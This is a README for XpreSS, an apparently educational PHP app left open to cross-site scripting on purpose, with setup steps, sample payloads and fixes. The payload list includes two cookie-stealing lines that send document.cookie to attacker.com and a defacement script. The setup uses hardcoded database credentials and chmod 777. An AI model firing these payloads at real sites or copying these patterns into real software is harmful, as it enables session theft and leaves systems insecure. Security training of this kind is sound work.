# XpreSS - Cross-Site Scripting Demonstration Platform

⚠️ **WARNING: This application is intentionally vulnerable for educational and security testing purposes only. DO NOT deploy to production or expose to the public internet!**

## Overview

XpreSS is a deliberately vulnerable PHP web application designed to demonstrate various types of Cross-Site Scripting (XSS) vulnerabilities. It's intended for:

- Security training and education
- Penetration testing practice
- Understanding XSS attack vectors
- Testing XSS detection tools
- Security research

## Features

### 1. **Reflected XSS** (search.php)
User input from URL parameters is directly echoed back without sanitization.

**Test URL:**
```
http://localhost/search.php?q=<script>alert('XSS')</script>
```

### 2. **Stored XSS** (guestbook.php)
User input is stored in a MySQL database and displayed to all visitors without sanitization.

**Test Payload:**
```
Name: <img src=x onerror=alert('XSS')>
Message: <svg onload=alert(document.cookie)>
```

### 3. **DOM-based XSS** (profile.php)
JavaScript processes URL parameters and inserts them into the DOM without sanitization.

**Test URL:**
```
http://localhost/profile.php?user=<img src=x onerror=alert('XSS')>
http://localhost/profile.php?bio=<script>alert('XSS')</script>
```

## Installation

### Prerequisites

- Debian-based Linux system (Debian, Ubuntu, etc.)
- Root or sudo access
- Internet connection

### Quick Setup

**Prerequisites:** Create the database and user on the remote database server `198.18.4.214` first (see Database Configuration section below).

1. **Clone or download this repository:**
   ```bash
   git clone <repository-url>
   cd XpreSS
   ```

2. **Make the setup script executable:**
   ```bash
   chmod +x setup-lamp.sh
   ```

3. **Run the setup script:**
   ```bash
   sudo ./setup-lamp.sh
   ```

4. **Access the application:**
   ```
   http://localhost/
   ```

### What the Setup Script Does

The `setup-lamp.sh` script automatically:

1. ✅ Updates system packages
2. ✅ Installs Apache web server
3. ✅ Installs MariaDB database server (optional, for database server host)
4. ✅ Configures remote database connection to `198.18.4.214`
5. ✅ **Automatically creates the guestbook table on the remote database**
6. ✅ Installs PHP and required modules
7. ✅ Configures Apache virtual host with environment variables
8. ✅ Copies application files to web root
9. ✅ Sets proper permissions
10. ✅ Configures firewall (if UFW is installed)
11. ✅ Creates test PHP info page

### Database Configuration

The application is configured to use a **remote MySQL database** at `198.18.4.214`:

- **Database Host**: `198.18.4.214` (hardcoded, remote server)
- **Database Name**: `xpress_db`
- **Database User**: `xpress_user`
- **Database Password**: `xpress_pass`
- **Database Port**: `3306`

#### Setting Up the Remote Database (Prerequisites)

**BEFORE running the setup script**, you must create the database and user on the remote server (`198.18.4.214`):

**On the database server (198.18.4.214):**

```sql
mysql -u root -p
```

Then run:

```sql
CREATE DATABASE IF NOT EXISTS xpress_db;
CREATE USER 'xpress_user'@'%' IDENTIFIED BY 'xpress_pass';
GRANT ALL PRIVILEGES ON xpress_db.* TO 'xpress_user'@'%';
FLUSH PRIVILEGES;
```

**Also ensure your remote database accepts connections:**
- Edit `/etc/mysql/mariadb.conf.d/50-server.cnf` or `/etc/mysql/mysql.conf.d/mysqld.cnf`
- Change `bind-address = 127.0.0.1` to `bind-address = 0.0.0.0`
- Restart MariaDB: `sudo systemctl restart mariadb`

**Note:** The guestbook table will be created automatically by the setup script using the `xpress_user` credentials. You only need to create the database and user yourself.

#### Environment Variables

Database credentials are stored as Apache environment variables in:
```
/etc/apache2/conf-available/xpress-env.conf
```

To change the database server or credentials after installation:
```bash
sudo nano /etc/apache2/conf-available/xpress-env.conf
sudo systemctl restart apache2
```

Available environment variables:
- `XPRESS_DB_HOST` - Database server IP/hostname (default: `198.18.4.214`)
- `XPRESS_DB_NAME` - Database name (default: `xpress_db`)
- `XPRESS_DB_USER` - Database username (default: `xpress_user`)
- `XPRESS_DB_PASS` - Database password (default: `xpress_pass`)
- `XPRESS_DB_PORT` - Database port (default: `3306`)

#### Testing Database Connection

Use the included test script to verify your database configuration:

```bash
sudo ./test-database.sh
```

This will:
- ✅ Read the configuration from Apache environment variables
- ✅ Test connectivity to the remote database server at `198.18.4.214`
- ✅ Verify the guestbook table exists
- ✅ Display entry count and recent entries

### Manual Installation

If you prefer to install manually or need to customize:

```bash
# Update system
sudo apt-get update && sudo apt-get upgrade -y

# Install Apache
sudo apt-get install -y apache2

# Install MariaDB
sudo apt-get install -y mariadb-server mariadb-client

# Install PHP
sudo apt-get install -y php libapache2-mod-php php-mysql

# Copy files
sudo mkdir -p /var/www/html/xpress
sudo cp *.php /var/www/html/xpress/
sudo cp .htaccess /var/www/html/xpress/
sudo chown -R www-data:www-data /var/www/html/xpress
sudo chmod -R 755 /var/www/html/xpress

# Enable Apache modules
sudo a2enmod rewrite

# Restart Apache
sudo systemctl restart apache2
```

### Remote Development

For local development with deployment to a remote server, you can use the included deploy script or rsync directly:

#### Using the Deploy Script (Recommended)

```bash
# Edit deploy.sh to set your server details
nano deploy.sh

# Make it executable
chmod +x deploy.sh

# Run deployment
./deploy.sh
```

The deploy script automatically excludes database configuration files and temporary files.

#### Using Rsync Directly

```bash
# Sync local code to remote server at 198.18.2.216
rsync -avz --exclude '.venv' --exclude '__pycache__' \
  -e "ssh -i ~/.ssh/ncae_try_2.pem" \
  /Users/corbanpendrak/Compile/XpreSS/ \
  debian@198.18.2.216:~/XpreSS/

# With delete option (removes files on remote that don't exist locally)
rsync -avz --delete --exclude '.venv' --exclude '__pycache__' \
  -e "ssh -i ~/.ssh/ncae_try_2.pem" \
  /Users/corbanpendrak/Compile/XpreSS/ \
  debian@198.18.2.216:~/XpreSS/

# Watch mode: sync on file changes (requires fswatch on macOS)
fswatch -o . | while read; do \
  rsync -avz --exclude '.venv' --exclude '__pycache__' \
    -e "ssh -i ~/.ssh/ncae_try_2.pem" \
    /Users/corbanpendrak/Compile/XpreSS/ \
    debian@198.18.2.216:~/XpreSS/; \
done
```

**Rsync options explained:**
- `-a` : Archive mode (preserves permissions, timestamps, etc.)
- `-v` : Verbose output
- `-z` : Compress data during transfer
- `--exclude` : Exclude files/directories (e.g., data files)
- `--delete` : Remove files on destination that don't exist in source

**Note:** Ensure SSH key authentication is set up for passwordless access, or you'll be prompted for the password on each sync.

## XSS Testing Payloads

### Basic Payloads

```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
```

### Cookie Stealing

```html
<script>fetch('http://attacker.com?cookie='+document.cookie)</script>
<img src=x onerror="this.src='http://attacker.com?c='+document.cookie">
```

### Session Hijacking Demo

```html
<script>alert('Session: ' + document.cookie)</script>
```

### DOM Manipulation

```html
<script>document.body.innerHTML='<h1>Defaced!</h1>'</script>
```

### Event Handlers

```html
<div onmouseover="alert('XSS')">Hover me</div>
<input onfocus="alert('XSS')" autofocus>
```

## File Structure

```
XpreSS/
├── index.php              # Main landing page with links to vulnerable pages
├── search.php             # Reflected XSS vulnerability
├── guestbook.php          # Stored XSS vulnerability (uses database)
├── profile.php            # DOM-based XSS vulnerability
├── db_config.php          # Database configuration (reads from env vars)
├── setup-lamp.sh          # Automated LAMP stack installation script
├── setup-database.sql     # SQL script for remote database setup
├── setup-users.sh         # User account setup script
├── test-database.sh       # Database connection testing script
├── deploy.sh              # Deployment script for remote servers
├── retro-style.css        # Retro blue pixelated theme stylesheet
├── README.md              # This file
└── .htaccess              # Apache configuration (optional)
```
└── README.md           # This file
```

## Security Notes

### Vulnerabilities Present

1. **No input validation** - User input is accepted without checks
2. **No output encoding** - Data is displayed without HTML encoding
3. **No Content Security Policy** - No CSP headers to prevent script execution
4. **Permissive file permissions** - Directories are world-writable
5. **No CSRF protection** - Forms don't validate request origin
6. **Direct DOM manipulation** - innerHTML used with unsanitized data

### How to Fix XSS (Educational)

If this were a production application, here's how you'd fix these issues:

#### 1. Input Validation
```php
// Validate input
if (!preg_match('/^[a-zA-Z0-9\s]+$/', $input)) {
    die('Invalid input');
}
```

#### 2. Output Encoding
```php
// Encode output
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
```

#### 3. Content Security Policy
```php
// Add CSP header
header("Content-Security-Policy: default-src 'self'");
```

#### 4. Use Modern Frameworks
Consider using frameworks with built-in XSS protection:
- Laravel (PHP)
- React/Vue (JavaScript)
- Django (Python)

## Usage Examples

### Testing Reflected XSS

1. Navigate to the search page
2. Enter a payload in the search box:
   ```
   <script>alert('Reflected XSS')</script>
   ```
3. Submit the form
4. Observe the script execution

### Testing Stored XSS

1. Navigate to the guestbook
2. Enter a malicious payload:
   - Name: `<img src=x onerror=alert('Stored XSS')>`
   - Message: `Testing stored XSS`
3. Submit the form
4. Observe that the script executes for all visitors

### Testing DOM-based XSS

1. Navigate to or construct a URL:
   ```
   http://localhost/profile.php?user=<img src=x onerror=alert('DOM XSS')>
   ```
2. Observe the script execution as the page loads

## Maintenance

### Reset Guestbook

To clear all guestbook entries:
```bash
sudo rm /var/www/html/xpress/guestbook_data.txt
```

### View Apache Logs

```bash
# Error log
sudo tail -f /var/log/apache2/xpress_error.log

# Access log
sudo tail -f /var/log/apache2/xpress_access.log
```

### Stop Services

```bash
# Stop Apache
sudo systemctl stop apache2

# Stop MariaDB
sudo systemctl stop mariadb
```

### Uninstall

```bash
# Remove application files
sudo rm -rf /var/www/html/xpress

# Remove Apache (if desired)
sudo apt-get remove --purge apache2

# Remove PHP (if desired)
sudo apt-get remove --purge php*

# Remove MariaDB (if desired)
sudo apt-get remove --purge mariadb-*
```

## Troubleshooting

### Apache won't start

Check the error log:
```bash
sudo journalctl -u apache2 -n 50
```

Common fixes:
```bash
# Check configuration
sudo apache2ctl configtest

# Check port 80 availability
sudo netstat -tulpn | grep :80
```

### PHP not working

Verify PHP is installed:
```bash
php -v
```

Check if PHP module is enabled:
```bash
sudo a2enmod php8.2  # or your PHP version
sudo systemctl restart apache2
```

### Permission denied errors

Fix permissions:
```bash
sudo chown -R www-data:www-data /var/www/html/xpress
sudo chmod -R 755 /var/www/html/xpress
```

### Cannot write to guestbook

Make the directory writable:
```bash
sudo chmod 777 /var/www/html/xpress
```

## Learning Resources

### XSS Prevention

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Content Security Policy Reference](https://content-security-policy.com/)
- [HTML5 Security Cheatsheet](https://html5sec.org/)

### Security Testing

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTheBox](https://www.hackthebox.eu/)

## Disclaimer

**This application is INTENTIONALLY INSECURE.** It is designed for educational purposes only. The creators assume no liability for any misuse or damage caused by this software.

- ❌ Do NOT deploy to production environments
- ❌ Do NOT expose to the public internet
- ❌ Do NOT use with real user data
- ✅ Use only in isolated test environments
- ✅ Use for education and authorized security testing only
- ✅ Always follow responsible disclosure practices

## License

This educational tool is provided as-is for learning purposes.

## Contributing

If you find additional vulnerabilities or have improvements:
1. Fork the repository
2. Create a feature branch
3. Submit a pull request

## Support

For questions or issues:
- Check the Troubleshooting section
- Review Apache/PHP logs
- Consult OWASP documentation

---

**Remember: With great power comes great responsibility. Use this knowledge ethically!** 🛡️
